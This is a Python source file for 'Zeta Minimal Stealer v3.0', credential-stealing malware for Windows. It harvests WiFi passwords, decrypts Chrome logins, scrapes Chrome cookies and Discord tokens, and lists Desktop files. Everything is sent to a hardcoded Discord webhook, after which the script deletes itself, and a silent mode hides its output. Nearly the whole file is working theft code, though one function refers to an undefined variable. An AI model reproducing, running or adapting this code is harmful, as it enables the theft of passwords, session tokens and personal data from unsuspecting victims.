#!/usr/bin/env python3
"""
Zeta Minimal Stealer v3.0
No external dependencies required
"""

import os
import sys
import json
import sqlite3
import base64
import shutil
import winreg
import subprocess
import platform
import socket
import getpass
import time
import urllib.request
import urllib.error
import tempfile
import ctypes
import ctypes.wintypes
import zipfile
import re

# ========== CONFIG ==========
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1446690566619267164/-8tbSKNp06zjEr5efF6xS8mRNLts_f1TnoqZqLF-oVhR12UCn2-sixp3yd7mNR-q5VuQ"
ENABLE_SELF_DESTRUCT = True
# ============================

def run_cmd(cmd, timeout=10):
    """Execute command and return output"""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
        )
        return result.stdout + result.stderr
    except:
        return ""

class ChromeStealer:
    """Steal Chrome data (Windows only)"""
    @staticmethod
    def decrypt_password(encrypted_password):
        """Decrypt Chrome password using DPAPI"""
        try:
            crypt32 = ctypes.windll.crypt32
            kernel32 = ctypes.windll.kernel32

            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.wintypes.DWORD),
                            ("pbData", ctypes.POINTER(ctypes.c_char))]

            in_blob = DATA_BLOB()
            out_blob = DATA_BLOB()

            in_blob.pbData = ctypes.c_char_p(encrypted_password)
            in_blob.cbData = len(encrypted_password)

            if crypt32.CryptUnprotectData(
                    ctypes.byref(in_blob), None, None, None, None, 0,
                    ctypes.byref(out_blob)):

                decrypted = ctypes.string_at(out_blob.pbData, out_blob.cbData)
                kernel32.LocalFree(out_blob.pbData)
                return decrypted.decode('utf-8', errors='ignore')
        except:
            pass
        return None

def collect_system_info():
    """Collect system information"""
    data = "╔══════════════════════════════════════════╗\n"
    data += "║         SYSTEM INFORMATION              ║\n"
    data += "╚══════════════════════════════════════════╝\n\n"

    # Basic info
    data += f"Computer: {socket.gethostname()}\n"
    data += f"User: {getpass.getuser()}\n"
    data += f"OS: {platform.platform()}\n"
    data += f"Architecture: {platform.architecture()[0]}\n"
    data += f"Time: {time.ctime()}\n\n"

    # Windows specific
    if sys.platform == "win32":
        # System info
        sysinfo = run_cmd("systeminfo")
        if sysinfo:
            data += "=== SYSTEMINFO ===\n"
            data += sysinfo[:1500] + "\n\n"

        # Network info
        netinfo = run_cmd("ipconfig /all")
        if netinfo:
            data += "=== NETWORK ===\n"
            data += netinfo[:1000] + "\n\n"

        # Users
        users = run_cmd("net user")
        if users:
            data += "=== USERS ===\n"
            data += users[:500] + "\n\n"

    return data

def collect_wifi_passwords():
    """Collect WiFi passwords (Windows only)"""
    data = "╔══════════════════════════════════════════╗\n"
    data += "║         WIFI PASSWORDS                  ║\n"
    wifi += "╚══════════════════════════════════════════╝\n\n"

    if sys.platform != "win32":
        data += "WiFi extraction only available on Windows\n"
        return data

    try:
        profiles = run_cmd("netsh wlan show profiles")
        if not profiles:
            data += "No WiFi profiles found\n"
            return data

        for line in profiles.split('\n'):
            if "All User Profile" in line:
                try:
                    profile = line.split(":")[1].strip()
                    details = run_cmd(f'netsh wlan show profile name="{profile}" key=clear')

                    password = "Not found"
                    for detail_line in details.split('\n'):
                        if "Key Content" in detail_line:
                            password = detail_line.split(":")[1].strip()
                            break

                    data += f"SSID: {profile}\nPassword: {password}\n\n"
                except:
                    data += f"SSID: {profile} (Error)\n"
    except Exception as e:
        data += f"Error: {str(e)}\n"

    return data

def collect_browser_data():
    """Collect browser data"""
    data = "╔══════════════════════════════════════════╗\n"
    data += "║         BROWSER DATA                    ║\n"
    data += "╚══════════════════════════════════════════╝\n\n"

    if sys.platform != "win32":
        data += "Browser data extraction only available on Windows\n"
        return data

    # Chrome paths
    chrome_paths = [
        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome Beta', 'User Data', 'Default'),
    ]

    for chrome_path in chrome_paths:
        if os.path.exists(chrome_path):
            data += f"\n=== CHROME ({chrome_path}) ===\n"

            # Cookies
            cookies_db = os.path.join(chrome_path, 'Cookies')
            if os.path.exists(cookies_db):
                try:
                    temp_db = os.path.join(tempfile.gettempdir(), 'cookies_temp.db')
                    shutil.copy2(cookies_db, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    # Get important cookies
                    cursor.execute("SELECT host_key, name FROM cookies WHERE host_key LIKE '%discord%' OR host_key LIKE '%google%' LIMIT 10")
                    cookies = cursor.fetchall()

                    if cookies:
                        data += "Important cookies found:\n"
                        for host, name in cookies:
                            data += f"  {host}: {name}\n"

                    conn.close()
                    os.remove(temp_db)
                except:
                    pass

            # Passwords
            login_db = os.path.join(chrome_path, 'Login Data')
            if os.path.exists(login_db):
                try:
                    temp_logins = os.path.join(tempfile.gettempdir(), 'logins_temp.db')
                    shutil.copy2(login_db, temp_logins)

                    conn = sqlite3.connect(temp_logins)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 5")

                    stealer = ChromeStealer()
                    for url, user, enc_pass in cursor.fetchall():
                        if user:
                            decrypted = stealer.decrypt_password(enc_pass)
                            if decrypted:
                                data += f"Login: {url}\n"
                                data += f"  User: {user}\n"
                                data += f"  Pass: {decrypted}\n"

                    conn.close()
                    os.remove(temp_logins)
                except:
                    pass

    return data

def collect_discord_tokens():
    """Collect Discord tokens"""
    data = "╔══════════════════════════════════════════╗\n"
    data += "║         DISCORD TOKENS                  ║\n"
    data += "╚══════════════════════════════════════════╝\n\n"

    discord_paths = []
    if sys.platform == "win32":
        discord_paths = [
            os.path.join(os.environ['LOCALAPPDATA'], 'Discord'),
            os.path.join(os.environ['LOCALAPPDATA'], 'DiscordCanary'),
        ]
    elif sys.platform == "darwin":
        discord_paths = [os.path.expanduser('~/Library/Application Support/discord')]
    else:
        discord_paths = [os.path.expanduser('~/.config/discord')]

    for discord_path in discord_paths:
        if os.path.exists(discord_path):
            data += f"\nChecking: {discord_path}\n"

            # Look for Local Storage
            leveldb = os.path.join(discord_path, 'Local Storage', 'leveldb')
            if os.path.exists(leveldb):
                for file in os.listdir(leveldb)[:5]:
                    if file.endswith('.ldb') or file.endswith('.log'):
                        try:
                            with open(os.path.join(leveldb, file), 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
                                for token in tokens[:3]:
                                    data += f"  Token: {token}\n"
                        except:
                            pass

    return data

def collect_file_list():
    """List important files"""
    data = "╔══════════════════════════════════════════╗\n"
    data += "║         FILE LIST                       ║\n"
    data += "╚══════════════════════════════════════════╝\n\n"

    # Desktop files
    desktop = ""
    if sys.platform == "win32":
        desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    else:
        desktop = os.path.expanduser('~/Desktop')

    if os.path.exists(desktop):
        data += "Desktop files:\n"
        files = os.listdir(desktop)[:10]
        for file in files:
            path = os.path.join(desktop, file)
            if os.path.isfile(path):
                size = os.path.getsize(path) / 1024
                data += f"  {file} ({size:.1f} KB)\n"

    return data

def send_to_discord_simple(data, filename="system_data.txt"):
    """Send data to Discord webhook - SIMPLE METHOD"""
    if WEBHOOK_URL == "YOUR_WEBHOOK_HERE":
        print("[!] No webhook configured")
        return False

    try:
        # Method 1: Send as JSON message (works for small data)
        if len(data) < 1500:
            payload = {
                "content": f"🔓 **ZETA STEALER** - `{socket.gethostname()}`\n```{data}```",
                "username": f"{getpass.getuser()}"
            }
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=10)
            return True

        # Method 2: Send as file (for larger data)
        # Create boundary
        boundary = '----WebKitFormBoundary' + str(int(time.time()))

        # Build body
        body = []
        body.append(f'--{boundary}')
        body.append('Content-Disposition: form-data; name="content"')
        body.append('')
        body.append(f'🔓 **ZETA STEALER** - `{socket.gethostname()}` - `{getpass.getuser()}`')

        body.append(f'--{boundary}')
        body.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"')
        body.append('Content-Type: text/plain')
        body.append('')
        body.append(data)

        body.append(f'--{boundary}--')
        body.append('')

        body_bytes = '\r\n'.join(body).encode('utf-8')

        req = urllib.request.Request(WEBHOOK_URL, data=body_bytes)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        req.add_header('User-Agent', 'Mozilla/5.0')

        urllib.request.urlopen(req, timeout=15)
        return True

    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error: {e.code} - {e.reason}")
        # Try fallback method
        try:
            # Send minimal data
            minimal = f"Host: {socket.gethostname()}\nUser: {getpass.getuser()}\n"
            payload = {"content": f"🔓 ZETA STEALER\n```{minimal}```"}
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=10)
            return True
        except:
            return False
    except Exception as e:
        print(f"[!] Send error: {str(e)}")
        return False

def main():
    """Main function"""
    print("[*] Zeta Stealer v3.0 - Starting...")

    # Collect data
    all_data = ""
    try:
        all_data += collect_system_info()
        all_data += "\n" + collect_wifi_passwords()
        all_data += "\n" + collect_browser_data()
        all_data += "\n" + collect_discord_tokens()
        all_data += "\n" + collect_file_list()
    except Exception as e:
        all_data += f"\nError during collection: {str(e)}\n"

    # Send to Discord
    if WEBHOOK_URL != "YOUR_WEBHOOK_HERE":
        print("[*] Sending data to Discord...")
        if send_to_discord_simple(all_data):
            print("[✓] Data sent successfully")
        else:
            print("[!] Failed to send data")
    else:
        print("[!] No webhook configured")
        # Save to file for debugging
        try:
            with open('debug_loot.txt', 'w', encoding='utf-8') as f:
                f.write(all_data)
            print("[✓] Data saved to debug_loot.txt")
        except:
            pass

    # Self-destruct
    if ENABLE_SELF_DESTRUCT:
        try:
            # Wait a bit then delete
            time.sleep(2)
            os.remove(sys.argv[0])
            print("[✓] Self-destruct completed")
        except:
            print("[!] Could not self-destruct")

    # Keep console open if double-clicked
    if len(sys.argv) == 1:  # No arguments
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    # Handle silent mode
    if len(sys.argv) > 1 and sys.argv[1] == "--silent":
        # Redirect output to null
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')

    main()
